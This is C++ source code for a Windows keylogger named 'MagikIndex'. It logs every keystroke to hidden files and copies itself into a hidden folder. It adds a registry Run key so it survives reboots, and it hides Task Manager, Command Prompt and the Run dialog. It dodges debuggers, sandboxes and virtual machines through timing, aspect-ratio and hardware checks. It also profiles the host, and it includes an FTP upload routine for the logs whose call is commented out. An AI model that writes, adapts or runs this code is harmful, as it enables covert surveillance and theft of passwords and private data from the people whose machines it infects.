#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <wininet.h>
#include <iostream>
#include <string>
#include <fstream>
#include <VersionHelpers.h>
#include <slpublic.h>
#include <vector>
#include <shellapi.h>
#include <time.h>
//#include <Wbemidl.h>
//#include <wbemcli.h>

#pragma warning( push )
#pragma warning( disable : 4477 )


typedef std::string String;
typedef std::vector<String> StringVector;
typedef unsigned long long uint64_t;

#define User ""
#define Password ""
#define MyServer ""

#define CharactersPerLog 5000
#define MaximumFolderSize 10 
#define MinimumRam 2048

#define MAX_LENGTH 1024


#define WINDOWS_SLID                                                \
            { 0x55c92734,                                           \
              0xd682,                                               \
              0x4d71,                                               \
              { 0x98, 0x3e, 0xd6, 0xec, 0x3f, 0x16, 0x05, 0x9f }    \
}


#pragma comment(lib, "Wininet.lib")
#pragma comment(lib, "Slwga.lib")
//#pragma comment(lib, "Wbemuuid.lib.")

#define debug


FILE* OUTPUT_FILE;


extern "C" int RandomGenerator();


int CalculateDirSize(std::string DirectoryToCheck) {

    HANDLE hFind;
    WIN32_FIND_DATAA data;

    DirectoryToCheck += "\\*.*";

    int FileCounter = 0;

    char FilePath[MAX_PATH + 1];
    DWORD FileSize = MAX_PATH + 1;

    hFind = FindFirstFileA(DirectoryToCheck.c_str(), &data);
    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            //GetFinalPathNameByHandleA(hFind, FilePath, FileSize, 0x0);
            //if (!(GetFileAttributesA(FilePath) & FILE_ATTRIBUTE_DIRECTORY)) {
            FileCounter++;
            //}
        } while (FindNextFileA(hFind, &data));
        FindClose(hFind);
    }

    return FileCounter;
}


BOOL RegisterMyProgramForStartup(PCSTR pszAppName, PCSTR pathToExe, PCSTR args)
{
    HKEY hKey = NULL;
    LONG lResult = 0;
    BOOL fSuccess = TRUE;
    DWORD dwSize;

    const size_t count = MAX_PATH * 2;
    char szValue[count] = {};


    strcpy_s(szValue, "\"");
    strcat_s(szValue, pathToExe);
    strcat_s(szValue, "\" ");

    if (args != NULL)
    {
        strcat_s(szValue, args);
    }

    lResult = RegCreateKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, 0, (KEY_WRITE | KEY_READ), NULL, &hKey, NULL);

    fSuccess = (lResult == 0);

    if (fSuccess)
    {
        dwSize = (DWORD)(strlen(szValue) + 1) * 2;
        lResult = RegSetValueExA(hKey, pszAppName, 0, REG_SZ, (BYTE*)szValue, dwSize);
        fSuccess = (lResult == 0);
    }

    if (hKey != NULL)
    {
        RegCloseKey(hKey);
        hKey = NULL;
    }

    return fSuccess;
}


void LogItInt(int key_stroke,std::string FileName) {
    if (key_stroke == 1 || key_stroke == 2) 
        return;
    if (key_stroke == VK_MBUTTON || key_stroke == VK_XBUTTON1 || key_stroke == VK_XBUTTON2 || key_stroke == 7)
        return;

    fopen_s(&OUTPUT_FILE,FileName.c_str(), "a+");

    std::cout << key_stroke << std::endl;

    if (key_stroke == 8)
        fprintf(OUTPUT_FILE, "%s", "[BACKSPACE]");
    else if (key_stroke == 13)
        fprintf(OUTPUT_FILE, "%s", "\n");
    else if (key_stroke == VK_SPACE)
        fprintf(OUTPUT_FILE, "%s", " ");
    else if (key_stroke == VK_LWIN)
        fprintf(OUTPUT_FILE, "%s", "[WIN]");
    else if (key_stroke == VK_TAB)
        fprintf(OUTPUT_FILE, "%s", "[TAB]");
    else if (key_stroke == VK_CAPITAL)
        fprintf(OUTPUT_FILE, "%s", "[CAPS LOCK]");
    else if (key_stroke == VK_SHIFT)
        fprintf(OUTPUT_FILE, "%s", "[SHIFT]");
    else if (key_stroke == VK_CONTROL)
        fprintf(OUTPUT_FILE, "%s", "[CONTROL]");
    else if (key_stroke == VK_ESCAPE)
        fprintf(OUTPUT_FILE, "%s", "[ESCAPE]");
    else if (key_stroke == VK_END)
        fprintf(OUTPUT_FILE, "%s", "[END]");
    else if (key_stroke == VK_HOME)
        fprintf(OUTPUT_FILE, "%s", "[HOME]");
    else if (key_stroke == VK_DELETE)
        fprintf(OUTPUT_FILE, "%s", "[DELETE]");
    else if (key_stroke == VK_LEFT)
        fprintf(OUTPUT_FILE, "%s", "[LEFT]");
    else if (key_stroke == VK_UP)
        fprintf(OUTPUT_FILE, "%s", "[UP]");
    else if (key_stroke == VK_RIGHT)
        fprintf(OUTPUT_FILE, "%s", "[RIGHT]");
    else if (key_stroke == VK_DOWN)
        fprintf(OUTPUT_FILE, "%s", "[DOWN]");
    else if (key_stroke == 190 || key_stroke == 110)
        fprintf(OUTPUT_FILE, "%s", ".");
    else
        fprintf(OUTPUT_FILE, "%s", &key_stroke);
    fclose(OUTPUT_FILE);
}


void FileSubmit(const char* localfile, const char* remotefile)
{
    HINTERNET hInternet;
    HINTERNET hFtpSession;
    hInternet = InternetOpenA(NULL, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (hInternet == NULL)
    {
        std::cout << "Error: " << GetLastError();

    }
    else
    {
        hFtpSession = InternetConnectA(hInternet, MyServer, INTERNET_DEFAULT_FTP_PORT, User, Password, INTERNET_SERVICE_FTP, 0, 0);
        if (hFtpSession == NULL)
        {
            std::cout << "Error ftp: " << GetLastError();
        }
        else
        {

            if (FtpPutFileA(hFtpSession, localfile, remotefile, FTP_TRANSFER_TYPE_BINARY, 0)){}
        }
    }
}


void LogItChar(std::string Value, std::string FileName) {
#ifndef debug
    if (IsDebuggerPresent()) {
        exit(0);
    }
#endif
    std::ofstream File;
    File.open(FileName, std::ios_base::app);
    File << Value;
    File << "\n";
    File.close();
}


ULONG WINAPI Protect(LPVOID);


ULONG WINAPI Protect(LPVOID Parameter) {

    if (IsDebuggerPresent()){
        exit(0);
    }
    while (1) {

        HWND Prog;
        Prog = FindWindowA(NULL, "Task Manager");
        ShowWindow(Prog, 0);
        Prog = FindWindowA(NULL, "Windows Task Manager");
        ShowWindow(Prog, 0);
        Prog = FindWindowA(NULL, "Command Prompt");
        ShowWindow(Prog, 0);
        Prog = FindWindowA(NULL, "C:\\Windows\\System32\\cmd.exe");
        ShowWindow(Prog, 0);
        Prog = FindWindowA(NULL, "Run");
        ShowWindow(Prog, 0);
        Sleep(200);
    }
    return 0;
}


int main()
{

    FreeConsole();

    CreateMutexA(0, FALSE, "Local\\$MagikIndex$");
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        exit(0);
    }

    DWORD Tick1 = GetTickCount();

    int RandSeed = (int)time(NULL) * Tick1 * GetCurrentProcessId() * (DWORD)RandomGenerator();

    srand(RandSeed);

    bool PatchedMe = false;

#ifndef debug

    int Time = 600000,Divider = rand()%10000 + 100,DividedSleep = Time/Divider;

    for (int j = 0; j <= Divider; j++) {
        Sleep(DividedSleep);
    }

    DWORD PatchCheck = GetTickCount();
    
    if ((int)(PatchCheck - Tick1) < Time - 5000) {
        PatchedMe = true;
    }


    unsigned long ThreadId;
    CreateThread(NULL, 0, Protect, 0, 0, &ThreadId);

#endif

Log:

    DWORD Tick = GetTickCount();

    std::string TimeText = "Current Tick:";
    std::string ComputerText = "Host Name:";
    std::string UsernameText = "User Name:";
    std::string InternetText = "Internet Status:";
    std::string WidthText = "Screen Width:";
    std::string HeightText = "Screen Height:";
    std::string AspectRatioText = "Aspect Ratio:";
    std::string WindowsText = "Windows Version:";
    std::string OEMText = "OEM Number:";
    std::string CPUNumberText = "Number Of Cores:";
    std::string CPUTypeText = "CPU Type:";
    std::string GenuineText = "Genuine Windows:";
    std::string SlowText = "Low-End CPU:";
    std::string MouseText = "Number Of Mouse Buttons:";
    std::string MonitorText = "Number Of Monitors:";
    std::string MiddleEastText = "Middle-East PC:";
    std::string BootText = "Normal Boot:";
    std::string RAMText = "RAM Size:";
    std::string SeedText = "Randomness Seed:";

    char* AppData = nullptr;
    size_t AppDataSize;
    _dupenv_s(&AppData, &AppDataSize, "APPDATA");

    char PathToFile[MAX_PATH];
    HMODULE GetModH = GetModuleHandle(NULL);
    GetModuleFileNameA(GetModH, PathToFile, sizeof(PathToFile));

    std::string LogTime = std::to_string(Tick);

    std::string CurrentLog = AppData;
    CurrentLog += "\\MagikIndex";

    CreateDirectoryA(CurrentLog.c_str(),NULL);

    SetFileAttributesA(CurrentLog.c_str(), FILE_ATTRIBUTE_HIDDEN);

    CurrentLog += "\\Log";
    CurrentLog += LogTime;
    CurrentLog += ".txt";

    SYSTEMTIME SysTime;
    char TimeBuffer[512];
    ZeroMemory(&TimeBuffer, sizeof(TimeBuffer));
    GetLocalTime(&SysTime);

    std::string StartDate = "_________";
    StartDate += std::to_string(SysTime.wDay);
    StartDate += "/";
    StartDate += std::to_string(SysTime.wMonth);
    StartDate += "/";
    StartDate += std::to_string(SysTime.wYear);
    StartDate += "  ";
    StartDate += std::to_string(SysTime.wHour);
    StartDate += ":";
    StartDate += std::to_string(SysTime.wMinute);
    StartDate += ":";
    StartDate += std::to_string(SysTime.wSecond);
    StartDate += "_________\n";

    LogItChar(StartDate, CurrentLog);

#ifdef debug

    LogItChar("#\n#/!\\STARTED IN DEBUG MODE/!\\\n#", CurrentLog);

#else

    LogItChar("Started in normal mode...", CurrentLog);              

#endif

    if (PatchedMe) {
        LogItChar("I was patched! Exiting... ;(",CurrentLog);
        exit(1);
    }


    DWORD Size = MAX_LENGTH+1;

    char HostName[MAX_LENGTH+1];

    char UserName[MAX_LENGTH+1];

    std::string InternetStatusString = "Not connected, error: ";

    DWORD DWFlags;

    //if (InternetCheckConnectionA("https://www.google.com", FLAG_ICC_FORCE_CONNECTION, 0)) { //switch between these two ways to check as you see fit, or even use both
    if (InternetGetConnectedState(&DWFlags,NULL)){
        InternetStatusString = "Connected";
    }else{
        InternetStatusString += std::to_string(GetLastError());
        InternetStatusString += ", returned flags: ";
        InternetStatusString += std::to_string(DWFlags);
    }

    GetComputerNameA(HostName,&Size);

    GetUserNameA(UserName,&Size);

    std::string DestinationFile = "C:\\Users\\";
    DestinationFile += UserName;
    DestinationFile += "\\Music\\MagikIndex";

    std::string MagikFolder = DestinationFile;

    CreateDirectoryA(DestinationFile.c_str(), NULL);

    SetFileAttributesA(DestinationFile.c_str(), FILE_ATTRIBUTE_HIDDEN);

    DestinationFile += "\\";

    char CharacterSet[62] = { 'A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','1','2','3','4','5','6','7','8','9','0' };
    for (int i = 0; i < 15; i++) {
        DestinationFile += CharacterSet[rand() % 61 + 0];
    }

    DestinationFile += ".exe";

    CopyFileA(PathToFile,DestinationFile.c_str(),false);

    RegisterMyProgramForStartup("MagikIndex", DestinationFile.c_str(), "");


    if (CalculateDirSize(MagikFolder) > MaximumFolderSize) {
        std::string Command = "/C del /f /q ";
        Command += MagikFolder;
        Command += "\\*.*";
        ShellExecuteA(0, "open", "cmd.exe", Command.c_str(), 0, SW_HIDE);
        LogItChar("Cleaned MagikIndex folder...",CurrentLog);
    }


    int x1, y1, x2, y2, w, h, mo, mb;

    x1 = GetSystemMetrics(SM_XVIRTUALSCREEN);
    y1 = GetSystemMetrics(SM_YVIRTUALSCREEN);
    x2 = GetSystemMetrics(SM_CXVIRTUALSCREEN);
    y2 = GetSystemMetrics(SM_CYVIRTUALSCREEN);
    mo = GetSystemMetrics(SM_CMONITORS);
    mb = GetSystemMetrics(SM_CMOUSEBUTTONS);
    w = x2 - x1;
    h = y2 - y1;

   
    double Ratios[6] = {4/3,16/9,21/9,32/9,16/10,5/4}; //check for monitor ratio (got this idea once i noticed heigth on my host and guest dont match, so if started in a not fullscreen VM the aspect ratio will be off)
    double Ratioed = (double)w / h;
    bool RatioMatch = false;
    for (int q = 0; q < 6; q++) {
        if (Ratioed == Ratios[q]) {
            RatioMatch = true;
        }
    }
#ifndef debug
    if (!RatioMatch) {
        LogItChar("Aspect ratio doesn't match the list: probably a VM... exiting....",CurrentLog);
        exit(1);
    }
#endif
    std::string Width = std::to_string(w);

    std::string Height = std::to_string(h);

    std::string WindowsVersion = "Unknown";

    std::string Monitors = std::to_string(mo);
    
    std::string MouseButtons = std::to_string(mb);

    std::string BootMode = "Yes";

    if (GetSystemMetrics(SM_CLEANBOOT) != 0) {
        BootMode = "No";
    }

    std::string SlowMachine = "No";

    if (GetSystemMetrics(SM_SLOWMACHINE) != 0) {
        SlowMachine = "Yes";
    }

    std::string MiddleEast = "No";
    if (GetSystemMetrics(SM_MIDEASTENABLED) != 0) {
        MiddleEast = "Yes";
    }

    if (IsWindows7OrGreater())
    {
        std::string WindowsVersion = "Seven";
    }

    if (IsWindows7SP1OrGreater())
    {
        std::string WindowsVersion = "Seven SP1";
    }

    if (IsWindows8OrGreater())
    {
        std::string WindowsVersion = "Eight";
    }

    if (IsWindows8Point1OrGreater())
    {
        std::string WindowsVersion = "Eight.one";
    }

    if (IsWindows10OrGreater())
    {
        std::string WindowsVersion = "Ten";
    }

    if (IsWindowsServer())
    {
        std::string WindowsVersion = "Server";
    }


    SYSTEM_INFO siSysInfo;
    GetSystemInfo(&siSysInfo);

    MEMORYSTATUSEX RAMStatus;
    RAMStatus.dwLength = sizeof(RAMStatus);
    GlobalMemoryStatusEx(&RAMStatus);

#ifndef debug
    if (siSysInfo.dwNumberOfProcessors < 2 || (RAMStatus.ullTotalPhys / 1024) / 1024 < MinimumRam) {
        LogItChar("PC Specs dont match the requirements: probably a VM... exiting....", CurrentLog);
        exit(1);
    }
#endif

    std::string OEMNumber = std::to_string(siSysInfo.dwOemId);
    std::string CPUCores = std::to_string(siSysInfo.dwNumberOfProcessors);
    std::string CPUType = std::to_string(siSysInfo.dwProcessorType);
    std::string RAMAmount = std::to_string((RAMStatus.ullTotalPhys / 1024) / 1024);
    
    std::string IsGenuine = "Yes";
    CONST SLID AppId = WINDOWS_SLID;
    SL_GENUINE_STATE GenuineState;
    HRESULT hResult;

    hResult = SLIsGenuineLocal(&AppId, &GenuineState, NULL);

    if (hResult == S_OK) {
        if (GenuineState != SL_GEN_STATE_IS_GENUINE) {
            IsGenuine = "No";
        }
    }


    TimeText += LogTime;
    LogItChar(TimeText, CurrentLog);

    ComputerText += HostName;
    LogItChar(ComputerText, CurrentLog);

    UsernameText += UserName;
    LogItChar(UsernameText, CurrentLog);

    InternetText += InternetStatusString;
    LogItChar(InternetText, CurrentLog);

    WidthText += Width;
    LogItChar(WidthText, CurrentLog);

    HeightText += Height;
    LogItChar(HeightText, CurrentLog);

    AspectRatioText += std::to_string(Ratioed);
    LogItChar(AspectRatioText,CurrentLog);

    WindowsText += WindowsVersion;
    LogItChar(WindowsText, CurrentLog);

    OEMText += OEMNumber;
    LogItChar(OEMText,CurrentLog);

    RAMText += RAMAmount;
    RAMText += " MB";
    LogItChar(RAMText,CurrentLog);

    CPUNumberText += CPUCores;
    LogItChar(CPUNumberText, CurrentLog);

    CPUTypeText += CPUType;
    LogItChar(CPUTypeText, CurrentLog);

    GenuineText += IsGenuine;
    LogItChar(GenuineText, CurrentLog);

    MouseText += MouseButtons;
    LogItChar(MouseText, CurrentLog);

    MonitorText += Monitors;
    LogItChar(MonitorText, CurrentLog);

    BootText += BootMode;
    LogItChar(BootText, CurrentLog);

    SlowText += SlowMachine;
    LogItChar(SlowText, CurrentLog);

    MiddleEastText += MiddleEast;
    LogItChar(MiddleEastText, CurrentLog);

    SeedText += std::to_string(RandSeed);
    LogItChar(SeedText, CurrentLog);


    LogItChar("------------------------------------------\n",CurrentLog);

    SetFileAttributesA(CurrentLog.c_str(), FILE_ATTRIBUTE_HIDDEN);




    int ArraySize = 10;

     int KeyList = {};


     for (int k = 0; k < CharactersPerLog;) {
         Sleep(25);
         for (int i = 8; i < 190; i++) {
             if (GetAsyncKeyState(i) == -32767) {
                 LogItInt(i, CurrentLog);
                 k++;
             }
         }
     }
     /*
     std::string RemoteFile = "Log";
     RemoteFile += LogTime;
     RemoteFile += ".txt";
     FileSubmit(CurrentLog.c_str(),RemoteFile.c_str());
     */
     goto Log;
     return 0;
}

#pragma warning( pop )